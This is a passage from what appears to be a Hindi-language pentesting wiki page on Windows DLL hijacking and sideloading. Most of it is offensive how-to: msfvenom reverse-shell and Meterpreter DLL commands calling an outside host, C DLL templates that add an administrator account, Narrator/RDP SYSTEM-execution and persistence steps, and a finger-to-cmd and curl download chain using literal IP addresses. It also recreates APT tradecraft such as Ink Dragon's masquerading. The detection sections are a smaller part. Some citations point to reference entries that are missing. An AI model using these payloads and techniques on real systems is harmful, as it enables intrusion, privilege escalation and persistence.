- यदि DLL को मौजूदा Windows version के लिए **known DLL** माना जाता है, तो system search process को **छोड़कर**, उस known DLL के version और उसकी dependent DLLs का उपयोग करता है। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** में इन known DLLs की सूची होती है।
- यदि किसी **DLL की dependencies** हैं, तो dependent DLLs की खोज ऐसे की जाती है मानो उन्हें केवल उनके **module names** से निर्दिष्ट किया गया हो—भले ही शुरुआती DLL को full path से पहचाना गया हो।

### Privileges बढ़ाना

**आवश्यकताएँ**:

- ऐसा process पहचानें जो **अलग privileges** के तहत चलता हो या चलेगा (horizontal या lateral movement), और जिसमें **DLL मौजूद न हो**।
- सुनिश्चित करें कि उस **directory** में **write access** उपलब्ध हो जिसमें **DLL** को **search किया जाएगा**। यह executable की directory या system path के भीतर कोई directory हो सकती है।

ये prerequisites सामान्यतः अपने-आप पूरी नहीं होतीं: privileged executables में आम तौर पर DLL dependencies missing नहीं होतीं, और standard users सामान्यतः system search-path directories में write नहीं कर सकते। फिर भी, misconfigured environments में ये दोनों स्थितियाँ सामने आ सकती हैं।\
अगर आवश्यकताएँ पूरी होती हैं, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। हालाँकि इसका मुख्य उद्देश्य UAC bypass है, इसमें कुछ खास Windows versions के लिए DLL-hijacking PoCs हैं, जिन्हें अक्सर आपके मिले writable directory के अनुसार बदला जा सकता है।

ध्यान दें कि आप किसी folder में अपनी permissions इस तरह **check** कर सकते हैं:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

और **PATH के अंदर मौजूद सभी फ़ोल्डरों की अनुमतियाँ जाँचें**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

आप executable के imports और dll के exports भी जाँच सकते हैं:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

पूरी guide के लिए कि **System Path फ़ोल्डर में लिखने की अनुमति** के साथ privileges escalate करने के लिए **DLL Hijacking का abuse कैसे करें**, देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### स्वचालित टूल

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जाँच करेगा कि क्या आपके पास system PATH के अंदर किसी फ़ोल्डर पर write permissions हैं।\
इस vulnerability को खोजने के लिए अन्य उपयोगी automated tools, **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll_।

### उदाहरण

अगर आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे ज़रूरी चीज़ों में से एक है **ऐसी dll बनाना जो executable द्वारा import किए जाने वाले कम-से-कम सभी functions को export करे**। ध्यान दें कि DLL Hijacking, [Medium Integrity level से High **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system)**.** escalate करने में भी काम आती है। **valid dll कैसे बनाएं**, इसका उदाहरण आपको इस DLL hijacking study में मिलेगा, जो execution के लिए DLL hijacking पर केंद्रित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**।**\
इसके अलावा, **अगले अनुभाग** में आपको कुछ **बुनियादी dll code** मिलेंगे, जो **templates** के रूप में या **बिना ज़रूरी functions export करने वाली dll** बनाने में उपयोगी हो सकते हैं।

## **DLL बनाना और compile करना**

### **DLL Proxifying**

मूल रूप से, **DLL proxy** ऐसी DLL होती है जो **लोड होने पर आपका malicious code चला सकती है**, और साथ ही **वास्तविक library को सभी calls relay करके** उसे **expose** भी करती है और **उसी तरह काम करती है** जैसे उसे करना चाहिए।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) टूल की मदद से आप **किसी executable को निर्दिष्ट करके proxify करने के लिए library चुन सकते हैं** और **proxified dll बना सकते हैं**, या **DLL निर्दिष्ट करके** भी **proxified dll बना सकते हैं**।

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक meterpreter (x86) प्राप्त करें:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक user बनाएं (x86, मुझे x64 version नहीं मिला):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### आपका अपना

कई मामलों में, आपके द्वारा compile की गई DLL को **victim process द्वारा import किए गए हर function को export करना होगा**। यदि कोई आवश्यक export मौजूद नहीं है, तो binary उसे resolve नहीं कर पाएगी और exploit विफल हो जाएगा।

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>user creation वाला C++ DLL उदाहरण</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Thread entry के साथ वैकल्पिक C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### Export-triggered initialization वाला NativeAOT DLL

एक self-contained **.NET NativeAOT shared library** को explicit `DllMain` implement किए बिना planted native DLL के रूप में इस्तेमाल किया जा सकता है। `[UnmanagedCallersOnly(EntryPoint = "...")]` के साथ static C# methods export करें; जब native host इन compiler-generated entry points में से किसी एक को call करता है, तो NativeAOT module को initialize करता है और exported C# body से पहले `[ModuleInitializer]` method चलता है। Output के लिए अलग से .NET runtime install करने की ज़रूरत नहीं होती।<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL में वही **export names और ABI-compatible signatures** होने चाहिए जिन्हें चुना गया host वास्तव में invoke करता है। Initialization trigger करने के लिए minimal stubs पर्याप्त हो सकते हैं, लेकिन exports का न होना loading रोक सकता है और गलत signature call को corrupt कर सकती है। Host imports की सूची बनाएँ और output का नाम host द्वारा अपेक्षित dependency name पर बदलने से पहले `dumpbin /exports payload.dll` से परिणाम validate करें।<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimal NativeAOT exported DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

प्रोजेक्ट को एक self-contained Windows native shared library के रूप में कॉन्फ़िगर करें:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Renamed DLL को copied, vulnerable executable के बगल में रखें और host को उस code path के ज़रिए शुरू करें जो compatible export को call करता है। यह initializer तरीका `DllMain` में सीधे complex काम रखने से बचाता है, लेकिन sideload की preconditions नहीं बदलतीं: loader को dependency को नाम से resolve करना चाहिए, application directory चुननी चाहिए, और उसे पहले KnownDLLs, पहले से loaded module, SxS redirection या restricted `LOAD_LIBRARY_SEARCH_*` flags के ज़रिए satisfy नहीं किया जाना चाहिए।<sup>[[26]](#references)[[30]](#references)</sup>

सामान्य native templates के लिए [Windows C payloads](../windows-c-payloads.md) देखें। Sideloaded first stage इसके बाद [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) कर सकता है, लेकिन यह DLL resolution का हिस्सा नहीं, बल्कि एक अलग injection technique है।

## Detection: DLL masquerading library loads

Elastic Defend 9.5.0 library-load event में `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` जोड़ता है, जब loaded file Microsoft-signed न हो और उसका filename, Windows/system DLL names की Elastic की cached inventory में मौजूद नाम से मेल खाता हो। इससे filename inventory, system-location और signature analysis endpoint sensor में हो जाते हैं; इसलिए core EQL को इस तरह छोटा किया जा सकता है:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Enrichment को अपने-आप में सबूत के बजाय एक उच्च-मूल्य वाले pivot के रूप में देखें। विश्वास तब बढ़ाएँ जब कोई signed host अपने **user-writable** directory से DLL load करे, DLL unsigned/untrusted हो, और `dll.Ext.relative_file_creation_time` दिखाए कि वह load होने से कुछ समय पहले ही बनाई गई थी। Exclusions को सटीक publisher + host process + installation path तक सीमित रखें; टकराने वाले DLL नाम को globally suppress न करें, क्योंकि वैध installers और applications निजी libraries को system-जैसे नामों से ship कर सकते हैं।<sup>[[26]](#references)</sup>

जिन sensors में यह enrichment उपलब्ध नहीं है, वहाँ टकराने वाले DLL नाम को non-system load path, अनुपस्थित/untrusted Microsoft signature, और file-create-to-load के कम अंतराल के साथ correlate करके इस behavior का अनुमान लगाएँ। इसके लिए एक maintained DLL-name inventory और `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` तथा अन्य approved deployment paths के लिए सीमित exclusions आवश्यक हैं।<sup>[[26]](#references)</sup>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अब भी start होने पर एक अनुमानित, language-specific localization DLL को probe करता है, जिसे hijack करके arbitrary code execution और persistence हासिल की जा सकती है।<sup>[[7]](#references)</sup>

मुख्य तथ्य
- Probe path (वर्तमान builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)।
- Legacy path (पुराने builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`।
- यदि OneCore path पर attacker के नियंत्रण वाली writable DLL मौजूद हो, तो उसे load किया जाता है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी export की आवश्यकता नहीं होती।

Procmon से खोज
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`।
- Narrator start करें और ऊपर दिए गए path को load करने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC में चुप्पी
- एक naive hijack से आवाज़ या UI highlight होगा। शांत रहने के लिए, attach होने पर Narrator threads की सूची लें, मुख्य thread खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; फिर अपने thread में आगे बढ़ें। पूरे code के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility कॉन्फ़िगरेशन के ज़रिए ट्रिगर और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए तरीके से, Narrator शुरू करने पर planted DLL लोड होती है। Secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।

RDP से ट्रिगर किया गया SYSTEM execution (lateral movement)
- Classic RDP security layer की अनुमति दें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host से RDP करें और logon screen पर Narrator लॉन्च करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।
- RDP session बंद होने पर execution रुक जाता है—जल्दी inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप किसी built-in Accessibility Tool (AT) की registry entry (जैसे, CursorIndicator) को clone करके, उसे किसी मनमाने binary/DLL की ओर इंगित करने के लिए edit करके, import कर सकते हैं; फिर `configuration` को उस AT name पर सेट करें। इससे Accessibility framework के तहत मनमाना execution proxy होता है।

नोट्स
- `%windir%\System32` में लिखने और HKLM values बदलने के लिए admin rights चाहिए।
- Payload का पूरा logic `DLL_PROCESS_ATTACH` में रखा जा सकता है; किसी export की ज़रूरत नहीं है।

## Case Study: CVE-2025-1729 - TPQMAssistant.exe का इस्तेमाल करके Privilege Escalation

यह मामला Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दिखाता है। इसे **CVE-2025-1729** के रूप में दर्ज किया गया है।<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability का विवरण

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` में मौजूद `TPQMAssistant.exe`।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` हर दिन सुबह 9:30 बजे logged-on user के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` को write करने की अनुमति है, जिससे local users मनमानी files डाल सकते हैं।
- **DLL Search Behavior**: यह पहले अपनी working directory से `hostfxr.dll` लोड करने की कोशिश करता है और उसके न मिलने पर "NAME NOT FOUND" log करता है। इससे पता चलता है कि local directory को search में प्राथमिकता दी जाती है।

### Exploit Implementation

हमलावर उसी directory में malicious `hostfxr.dll` stub रखकर, missing DLL का फायदा उठा सकता है और user के context में code execution हासिल कर सकता है:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Attack Flow

1. एक standard user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. निर्धारित task के मौजूदा user के context में सुबह 9:30 बजे चलने की प्रतीक्षा करें।
3. यदि task execute होने के समय कोई administrator logged in है, तो malicious DLL administrator के session में medium integrity पर चलता है।
4. medium integrity से SYSTEM privileges तक elevate करने के लिए standard UAC bypass techniques को chain करें।

## Case Study: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) के ज़रिए DLL Side-Loading

Threat actors अक्सर trusted, signed process के तहत payloads execute करने के लिए MSI-based droppers को DLL side-loading के साथ जोड़ते हैं।<sup>[[10]](#references)</sup>

Chain overview
- User MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (जैसे, LaunchApplication या VBScript action), और embedded resources से अगला stage फिर से तैयार करता है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को उसी directory में लिखता है (उदाहरण pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- Signed EXE शुरू होने पर, Windows DLL search order पहले working directory से wsc.dll load करता है, जिससे signed parent के तहत attacker code execute होता है (ATT&CK T1574.001)।

MSI analysis (क्या देखना है)
- CustomAction table:
  - ऐसे entries देखें जो executables या VBScript चलाते हैं। उदाहरण के लिए, संदिग्ध pattern: LaunchApplication का background में embedded file execute करना।
  - Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables inspect करें।
- MSI CAB में embedded/split payloads:
  - Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
  - या lessmsi इस्तेमाल करें: lessmsi x package.msi C:\out
  - कई छोटे fragments देखें, जिन्हें VBScript CustomAction द्वारा concatenate और decrypt किया जाता है। सामान्य flow:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- इन दो फ़ाइलों को एक ही फ़ोल्डर में रखें:
  - wsc_proxy.exe: वैध signed host (Avast)। यह process अपनी directory से नाम के आधार पर wsc.dll load करने की कोशिश करता है।
  - wsc.dll: attacker DLL। अगर किसी खास exports की ज़रूरत नहीं है, तो DllMain काफ़ी हो सकता है; अन्यथा, एक proxy DLL बनाएँ और payload को DllMain में चलाते हुए ज़रूरी exports को genuine library तक forward करें।
- एक minimal DLL payload बनाएँ:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export requirements के लिए, एक proxying framework (जैसे DLLirant/Spartacus) का उपयोग करके ऐसी forwarding DLL जनरेट करें जो आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। अगर host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack विफल हो सकता है।
- KnownDLLs, SxS और forwarded exports precedence को प्रभावित कर सकते हैं; host binary और export set चुनते समय इनका ध्यान रखें।

## Signed triads + encrypted payloads (ShadowPad केस स्टडी)

Check Point ने बताया कि Ink Dragon, legitimate software में घुलमिल जाने और core payload को disk पर encrypted रखने के लिए **three-file triad** का उपयोग करके ShadowPad deploy करता है:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। हमलावर executable का नाम बदलकर उसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature valid रहती है।
2. **Malicious loader DLL** – इसे EXE के साथ, अपेक्षित नाम (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) से रखा जाता है। यह DLL आम तौर पर ScatterBrain framework से obfuscated MFC binary होती है; इसका एकमात्र काम encrypted blob को ढूँढ़ना, उसे decrypt करना और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – इसे अक्सर उसी directory में `<name>.tmp` के रूप में रखा जाता है। Decrypted payload को memory-map करने के बाद, loader forensic evidence मिटाने के लिए TMP file delete कर देता है।

Tradecraft संबंधी टिप्पणियाँ:

* Signed EXE का नाम बदलने पर (PE header में मूल `OriginalFileName` को बनाए रखते हुए) वह Windows binary जैसा दिख सकता है और vendor signature भी बरकरार रहती है। इसलिए Ink Dragon की उस आदत को दोहराएँ जिसमें `conhost.exe` जैसी दिखने वाली, लेकिन वास्तव में AMD/NVIDIA utilities वाली binaries रखी जाती हैं।
* क्योंकि executable trusted रहता है, ज़्यादातर allowlisting controls के लिए सिर्फ़ आपकी malicious DLL का उसके साथ मौजूद होना ज़रूरी है। Loader DLL को customize करने पर ध्यान दें; आम तौर पर signed parent को बिना बदलाव चलाया जा सकता है।
* ShadowPad के decryptor को उम्मीद होती है कि TMP blob loader के साथ वाली directory में हो और writable हो, ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory को writable रखें; memory में आने के बाद OPSEC के लिए TMP file को सुरक्षित रूप से delete किया जा सकता है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators, DLL sideloading को LOLBAS के साथ जोड़ते हैं, ताकि disk पर मौजूद एकमात्र custom artifact trusted EXE के साथ रखी malicious DLL हो:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` चलाता है, Finger server से commands लेता है और उन्हें `cmd` तक pipe करता है:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` TCP/79 से text खींचता है; `| cmd` server response को execute करता है, जिससे operators server-side पर second stage को rotate कर सकते हैं।

- **Built-in download/extract:** benign extension वाली archive download करें, उसे unpack करें, और sideload target के साथ DLL को किसी random `%LocalAppData%` folder में stage करें:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` progress छिपाता है और redirects follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM से launch:** EXE को WMI के ज़रिए शुरू करें, ताकि telemetry में colocated DLL लोड करते समय CIM-created process दिखाई दे:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (जैसे, `intelbq.exe`, `nearby_share.exe`); payload (जैसे, Remcos) trusted name के तहत चलता है।

- **Hunting:** जब `/p`, `/m`, और `/c` एक साथ दिखाई दें, तो `forfiles` पर alert करें; admin scripts के बाहर यह असामान्य है।


## केस स्टडी: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल के Lotus Blossom intrusion में NSIS-packed dropper पहुँचाने के लिए एक trusted update chain का दुरुपयोग किया गया। इस dropper ने DLL sideload और पूरी तरह memory में चलने वाले payloads को stage किया।<sup>[[13]](#references)</sup>

Tradecraft का प्रवाह
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** के रूप में चिह्नित करता है, Bitdefender Submission Wizard का renamed `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` drop करता है, फिर EXE launch करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` इसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material पहले के hash से निकाला गया), buffer को plaintext shellcode से overwrite करता है, अस्थायी data मुक्त करता है, और उस पर jump करता है।
- IAT से बचने के लिए, loader **FNV-1a basis 0x811C9DC5 + prime 0x1000193** का उपयोग करके export names को hash करता है, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करता है और salted target hashes से तुलना करता है।

मुख्य shellcode (Chrysalis)
- पाँच passes में key `gQ2JR&9;` के साथ add/XOR/sub दोहराकर PE-जैसे main module को decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` को dynamically load करता है।
- Runtime पर per-character bit-rotate/XOR transforms से DLL name strings पुनर्निर्मित करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** को traverse करता है, प्रत्येक export table को 4-byte blocks में Murmur-style mixing के साथ parse करता है, और hash नहीं मिलने पर ही `GetProcAddress` का सहारा लेता है।

Embedded configuration और C2
- Config, dropped `BluetoothService` file में **offset 0x30808** (size **0x980**) पर है और key `qwhvb^435h&*7` से RC4-decrypt होता है, जिससे C2 URL और User-Agent सामने आते हैं।
- Beacons dot-delimited host profile बनाते हैं, tag `4Q` जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से भेजने से पहले key `vAuig34%^325hGV` से RC4-encrypt करते हैं। Responses RC4-decrypt होते हैं और tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) के ज़रिए dispatch होते हैं।
- Execution mode CLI args पर निर्भर है: बिना args = `-i` की ओर संकेत करने वाली persistence (service/Run key) install करना; `-i` self को `-k` के साथ फिर launch करता है; `-k` install छोड़कर payload चलाता है।

देखा गया alternate loader
- इसी intrusion में Tiny C Compiler भी drop किया गया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` चलाया गया, जिसके बगल में `libtcc.dll` था। Attacker द्वारा दिए गए C source में shellcode embedded था; उसे compile करके memory में चलाया गया, बिना PE को disk पर लिखे। इसे इस तरह दोहराएँ:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- इस TCC-based compile-and-run चरण ने runtime पर `Wininet.dll` import किया और hardcoded URL से second-stage shellcode प्राप्त किया, जिससे एक flexible loader बना जो compiler run का रूप धारण करता है।

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains में **stability engineering** जोड़ी जाती है, ताकि legitimate host बाद के stages को बिना crash हुए ठीक से load करने के लिए पर्याप्त समय तक चलता रहे।<sup>[[11]](#references)</sup>

देखा गया पैटर्न
- एक trusted EXE को malicious DLL के साथ, `version.dll` जैसे अपेक्षित dependency name के तहत रखें।
- Malicious DLL सभी अपेक्षित exports को असली system DLL (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) पर **proxy** करता है, ताकि import resolution सफल रहे और host process काम करता रहे।
- Load होने के बाद, malicious DLL host entry point को **patch** करता है, ताकि main thread बाहर निकलने या process को समाप्त करने वाले code paths चलाने के बजाय अनंत `Sleep` loop में चला जाए।
- एक नया thread असली malicious काम करता है: अगले-stage DLL का name या path decrypt करता है (RC4/XOR आम हैं), फिर उसे `LoadLibrary` से launch करता है।

यह क्यों मायने रखता है
- सामान्य DLL proxying API compatibility बनाए रखती है, लेकिन यह सुनिश्चित नहीं करती कि बाद के stages के लिए host पर्याप्त समय तक चलता रहे।
- Main thread को `Sleep(INFINITE)` में रोकना, loader द्वारा worker thread में decryption, staging या network bootstrap किए जाने तक signed process को चालू रखने का एक आसान तरीका है।
- केवल suspicious `DllMain` की तलाश करने पर यह पैटर्न छूट सकता है, अगर दिलचस्प गतिविधि host entry point के patch होने और secondary thread शुरू होने के बाद होती है।

न्यूनतम workflow
1. Signed host EXE कॉपी करें और पता लगाएँ कि यह local directory से कौन-सी DLL resolve करता है।
2. समान functions export करने और उन्हें legitimate DLL पर forward करने वाली proxy DLL बनाएँ।
3. `DllMain(DLL_PROCESS_ATTACH)` में worker thread बनाएँ।
4. उस thread से host entry point या main thread start routine को patch करें, ताकि वह `Sleep` पर loop करे।
5. अगले-stage DLL का name/config decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

रक्षात्मक जाँच के संकेत
- ऐसे signed processes जो `version.dll` या इसी तरह की आम libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load होने के तुरंत बाद process entry point पर memory patches, खासकर ऐसे jumps/calls जो `Sleep`/`SleepEx` पर redirect हों।
- Proxy DLL द्वारा बनाए गए ऐसे threads जो तुरंत decrypted name वाली दूसरी DLL पर `LoadLibrary` call करते हैं।
- Writable staging directories, जैसे `ProgramData`, `%TEMP%` या unpacked archive paths में vendor executables के बगल में रखी गई full-export proxy DLLs।

## References

- [1] [Red Canary – Intelligence Insights: जनवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
